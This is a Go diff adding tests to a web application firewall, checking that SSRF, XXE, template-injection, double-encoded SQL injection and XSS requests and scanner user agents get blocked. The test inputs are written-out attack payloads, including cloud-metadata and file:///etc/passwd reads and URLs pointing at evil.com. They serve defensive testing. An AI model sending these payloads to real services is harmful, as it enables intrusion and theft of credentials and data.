@@ -1,10 +1,12 @@
 package waf
 
 import (
+	"fmt"
 	"io"
 	"log/slog"
 	"net/http"
 	"net/http/httptest"
+	"strings"
 	"testing"
 )
 
@@ -229,6 +231,175 @@ func TestProtocolAttack(t *testing.T) {
 			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
 			assertBlocked(t, handler, r)
 		})
+	}
+}
+
+func TestSSRF(t *testing.T) {
+	handler := newTestMiddleware(t)
+	tests := []struct {
+		name string
+		uri  string
+	}{
+		{"aws metadata", "/api?url=http://169.254.169.254/latest/meta-data/"},
+		{"google metadata", "/api?url=http://metadata.google.internal/computeMetadata/v1/"},
+		{"alibaba metadata", "/api?url=http://100.100.100.200/latest/meta-data/"},
+		{"localhost http", "/api?url=http://127.0.0.1:8080/admin"},
+		{"localhost name", "/api?url=http://localhost/admin"},
+		{"ipv6 loopback", "/api?url=http://[::1]/admin"},
+		{"file scheme", "/api?path=file:///etc/passwd"},
+		{"gopher scheme", "/api?url=gopher://evil.com:25/"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
+			assertBlocked(t, handler, r)
+		})
+	}
+}
+
+func TestSSRFInHeader(t *testing.T) {
+	handler := newTestMiddleware(t)
+	r := httptest.NewRequest(http.MethodGet, "/", nil)
+	r.Header.Set("X-Redirect", "http://169.254.169.254/latest/")
+	assertBlocked(t, handler, r)
+}
+
+func TestXXE(t *testing.T) {
+	handler := newTestMiddleware(t)
+	tests := []struct {
+		name string
+		uri  string
+	}{
+		{"doctype entity", "/api?xml=<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+'file:///etc/passwd'>]>"},
+		{"entity decl", "/api?xml=<!ENTITY+xxe+SYSTEM+'file:///etc/passwd'>"},
+		{"system file", `/api?xml=SYSTEM+"file:///etc/passwd"`},
+		{"system http", `/api?xml=SYSTEM+"https://evil.com/dtd"`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
+			assertBlocked(t, handler, r)
+		})
+	}
+}
+
+func TestSSTI(t *testing.T) {
+	handler := newTestMiddleware(t)
+	tests := []struct {
+		name string
+		uri  string
+	}{
+		{"jinja2 config", "/page?x={{config}}"},
+		{"jinja2 self", "/page?x={{self.__dict__}}"},
+		{"jinja2 request", "/page?x={{request.environ}}"},
+		{"class traversal", "/page?x={{''.__class__.__mro__}}"},
+		{"freemarker", "/page?x=<#assign+ex='freemarker'>"},
+		{"spring el", "/page?x=${T(java.lang.Runtime).getRuntime()}"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
+			assertBlocked(t, handler, r)
+		})
+	}
+}
+
+func TestDoubleEncoding(t *testing.T) {
+	handler := newTestMiddleware(t)
+	tests := []struct {
+		name string
+		uri  string
+	}{
+		// %2527 double-decodes to %27 then to ' which triggers SQL injection
+		{"double-encoded sqli", "/search?q=1%2527%2BOR%2B1%253D1"},
+		// %253C double-decodes to %3C then to < which triggers XSS
+		{"double-encoded xss", "/page?q=%253Cscript%253Ealert(1)%253C/script%253E"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			r := httptest.NewRequest(http.MethodGet, tt.uri, nil)
+			assertBlocked(t, handler, r)
+		})
+	}
+}
+
+func TestURITooLong(t *testing.T) {
+	handler := newTestMiddleware(t)
+	longPath := "/" + strings.Repeat("a", maxURILength+1)
+	r := httptest.NewRequest(http.MethodGet, longPath, nil)
+	assertBlocked(t, handler, r)
+}
+
+func TestTooManyHeaders(t *testing.T) {
+	handler := newTestMiddleware(t)
+	r := httptest.NewRequest(http.MethodGet, "/", nil)
+	for i := 0; i < maxHeaderCount+10; i++ {
+		r.Header.Add(fmt.Sprintf("X-Custom-%d", i), "value")
+	}
+	assertBlocked(t, handler, r)
+}
+
+func TestNewScannerUserAgents(t *testing.T) {
+	handler := newTestMiddleware(t)
+	agents := []string{
+		"wpscan/3.8",
+		"WhatWeb/0.5",
+		"joomscan/1.0",
+		"ffuf/v2.0",
+		"feroxbuster/2.10",
+		"wfuzz/3.1",
+	}
+	for _, ua := range agents {
+		t.Run(ua, func(t *testing.T) {
+			r := httptest.NewRequest(http.MethodGet, "/", nil)
+			r.Header.Set("User-Agent", ua)
+			assertBlocked(t, handler, r)
+		})
+	}
+}
+
+func TestSecurityHeadersOnBlock(t *testing.T) {
+	handler := newTestMiddleware(t)
+	r := httptest.NewRequest(http.MethodGet, "/search?q=1+UNION+SELECT+*+FROM+users", nil)
+	rr := httptest.NewRecorder()
+	handler.ServeHTTP(rr, r)
+
+	if rr.Code != http.StatusForbidden {
+		t.Fatalf("expected 403, got %d", rr.Code)
+	}
+	if got := rr.Header().Get("X-Content-Type-Options"); got != "nosniff" {
+		t.Errorf("X-Content-Type-Options = %q, want nosniff", got)
+	}
+	if got := rr.Header().Get("X-Frame-Options"); got != "DENY" {
+		t.Errorf("X-Frame-Options = %q, want DENY", got)
+	}
+	if got := rr.Header().Get("Cache-Control"); got != "no-store" {
+		t.Errorf("Cache-Control = %q, want no-store", got)
+	}
+}
+
+func TestAuditOnlyMode(t *testing.T) {
+	var blocked bool
+	mw := NewMiddleware(Config{
+		Enabled:   true,
+		AuditOnly: true,
+		OnBlock: func(evt BlockEvent) {
+			blocked = true
+		},
+	}, slog.New(slog.NewTextHandler(io.Discard, nil)))
+	handler := mw(dummyHandler)
+
+	r := httptest.NewRequest(http.MethodGet, "/search?q=1+UNION+SELECT+*+FROM+users", nil)
+	rr := httptest.NewRecorder()
+	handler.ServeHTTP(rr, r)
+
+	// In audit mode, the request should pass through (200), not be blocked (403)
+	if rr.Code != http.StatusOK {
+		t.Errorf("audit mode should pass through, got %d", rr.Code)
+	}
+	// But OnBlock should still have been called
+	if !blocked {
+		t.Error("OnBlock was not called in audit mode")
 	}
 }
 
